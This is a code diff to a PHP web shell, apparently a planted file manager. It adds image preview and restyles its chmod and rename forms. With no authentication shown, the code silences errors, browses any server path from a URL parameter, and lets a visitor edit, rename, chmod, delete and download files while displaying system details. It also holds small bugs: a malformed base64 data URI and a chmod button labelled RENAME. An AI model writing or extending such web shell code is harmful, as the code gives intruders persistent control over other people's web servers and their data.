@@ -264,6 +264,10 @@ td.lol {
 tr.file:last-child {
 	border-bottom:none;
 }
+.icon {
+	width:25px;
+	height:20px;
+}
 @media screen and (max-width: 600px) {
   table {
   margin: 0;
@@ -271,6 +275,10 @@ tr.file:last-child {
   padding: 10px;
   width: 100%;
   border-radius:10px;
+}
+.icon {
+	width:20px;
+	height:20px;
 }
 select {
 	padding:3px;
@@ -356,7 +364,7 @@ input[type=submit] {
     </tr>
 </thead>
 <?php
-error_reporting();
+error_reporting(0);
 function cwd() {
   if (isset($_GET['path'])) {
     $cwd = @str_replace('\\', '/', $_GET['path']);
@@ -552,6 +560,76 @@ if (@$_GET['action'] == 'file') {
 	<?php
 	exit();
 }
+if (@$_GET['action'] == 'img') {
+	$file = $_GET['file'];
+	?>
+	<tr>
+		<td class="not mas sup">
+			<span class="a">
+				Filename
+			</span>
+		</td>
+		</div>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<span><u><?=permission(cwd(),basename($file))?></u></span>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Size 
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=size($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Type
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=get_type($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not"></td>
+		<td class="not"></td>
+		<td class="not">
+			<?php
+			list($width, $height, $type, $attr) = getimagesize(basename($file));
+			echo "" .$attr. "";
+			$arr = array('h' => $height, 'w' => $width, 'a' => $attr);
+			?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
+			<center>
+				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
+				<a class="fo act t" href="?path=<?=cwd()?>&action=img&file=<?=$file?>">PREVIEW</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+			</center>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
+			<center>
+				<img src="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).'/'.basename($file)?>">
+			</center>
+		</td>
+	</tr>
+	<?php
+	exit();
+}
 function get_type($filename) {
     $idx = explode( '.', $filename );
     $count_explode = count($idx);
@@ -612,7 +690,12 @@ function get_type($filename) {
      return 'application/octet-stream';
     }
  }
-
+function img($img) {
+	$type = pathinfo($img, PATHINFO_EXTENSION);
+	$data = file_get_contents($img);
+	$base64 = 'data:image/' . $type . ';base64' . base64_encode($data);
+	return $base64;
+}
 function alert($type, $msg) {
 	?>
 	<tr>
@@ -635,11 +718,7 @@ function makefile($file, $text) {
 	fclose($handle);
 }
 function changemode($file, $mode) {
-	if (chmod($file, $mode)) {
-		print("success");
-	} else {
-		print("Failed");
-	}
+	return chmod($file, $mode);
 }
 function delete($filename) {
   if (@is_dir($filename)) {
@@ -741,27 +820,67 @@ if (isset($_GET['makefile'])) {
 if (isset($_GET['chmod'])) {
 	$file = $_GET['file'];
 	if (isset($_POST['submit'])) {
-		changemode($file, $_POST['mode']);
+		if (changemode($file, $_POST['mode'])) {
+			alert('success', 'change mode to '.$_POST['mode'].'');
+		} else {
+			alert("failed");
+		}
 	}
 	?>
 	<form method="post">
 		<tr>
-			<td class="not">
+			<td class="not mas sup">
+				<span class="a">
+					Filename
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<span><u><?=permission(cwd(),basename($file))?></u></span>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Size 
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=size($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Type
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=get_type($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
 				<center>
-					<div class="action_f">
-						<div class="act">
-						<span class="a">Filename : <u><?= permission($file, basename($file)) ?></u></span><br>
-						<span class="a">Size : <?=size($file)?></span><br>
-						<span class="a">Type : <?=mime_content_type($file)?></span>
-						&nbsp;&nbsp;
-						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
-						<a class="b act" href="?path=<?=cwd()?>">back</a>
-						</div><br>
-						<input class="action" type="text" name="mode" value="<?=substr(sprintf("%o", fileperms($file)), -4)?>"><br><br>
-						<input style="width:100%;" type="submit" name="submit" value="CHANGE">
-					</div>
-					</div>
+					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
+					<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+					<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+					<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
 				</center>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
+				<input class="action" type="text" name="mode" value="<?=substr(sprintf("%o", fileperms($file)), -4)?>">
+			</td>
+		</tr>
+		<tr>
+			<td colspan="3">
+				<input style="width:100%;" type="submit" name="submit" value="RENAME">
 			</td>
 		</tr>
 	</form>
@@ -778,7 +897,9 @@ if (isset($_GET['rename'])) {
 	$file = $_GET['file'];
 	if (isset($_POST['submit'])) {
 		if (renames($file, $_POST['newname'])) {
-			$alert = alert("success", "rename");
+			?>
+			<script type="text/javascript">window.location='?path=<?=cwd()?>'</script>
+			<?php
 		} else {
 			$alert = alert("failed", "rename");
 		}
@@ -923,7 +1044,7 @@ function get_server_info(){
     $server_info['uname'] = "<span class='strong' style='color:green;'>".php_uname()."</span>";
     $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
     $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
-    $server_info['dir'] = "<span class='strong'><u>".cwd()."/</u></span>";
+    $server_info['dir'] = "<span class='strong'><u>".cwd()."</u></span>";
     return $server_info;
   }
 ?>
@@ -931,11 +1052,11 @@ function get_server_info(){
   <?php
   $scandir = scandir(cwd());
   	foreach ($scandir as $dir) {
-  		if (is_dir($dir)) {
+  		if (!is_dir($dir) || $dir === '.')continue;
   			if ($dir === '..') {
-  				$back = "<a class='sa su' href='?path=".dirname(cwd())."'>".$dir."</a>";
-  			} elseif($dir === '.') {
-  				$back = "<a class='sa su' href='?path=".cwd()."'>".$dir."</a>";
+  				$back = "<a class='sa su' href='?path=".dirname(cwd())."'>
+  						<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfkBgQCNQ9wKZqKAAAAdUlEQVQoz52RvRFAQBCFP0YBrhSjMoEe9CAQGlqQSBmRgA4EenArMEZw5/y8Db83s/vewgcpMiIXHhAWPBcWCjsO6RGEisCFaxv2UDTEwEzCZvAZWsQxq/8QXV8rRlK0YZiOIzsEobRneGk5i8p/V/3iWTfaAREANO0Y4uibAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTA0VDAyOjUzOjE0KzAwOjAwh6in4QAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0wNFQwMjo1MzoxNCswMDowMPb1H10AAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC'>
+  						</a>";
   			} else {
   				$back = "<a class='sa su' href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
   			} if ($dir === '.' || $dir === '..') {
@@ -967,15 +1088,25 @@ function get_server_info(){
   				</td>
   			</tr>
   			<?php
-  		}
   	}
   	foreach ($scandir as $file) {
   		if (is_file($file)) {
-  			$files = cwd().'/'.$file
+  			$files = cwd().'/'.$file;
   			?>
   			<tr class="file">
-  				<td class="tol">
-  					<a class="sa so" href="?path=<?=cwd()?>&action=file&file=<?=$files?>"><?= basename($files) ?></a>
+  				<td>
+  					<a href='
+  				<?php
+  				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+  				if ($ext === 'png') {
+  					print("?path=".cwd()."&action=img&file=".$files."");
+  				} elseif ($ext === 'jpg') {
+  					print("?path=".cwd()."&action=img&file=".$files."");
+  				} elseif ($ext === 'ico') {
+  					print("?path=".cwd()."&action=img&file=".$files."");
+  				} else {
+  					print("?path=".cwd()."&action=file&file=".$files."");
+  				} ?>'><?=basename($files)?></a>
   				</td>
   				<td class="pol">
   					<center><?= size($files); ?></center>
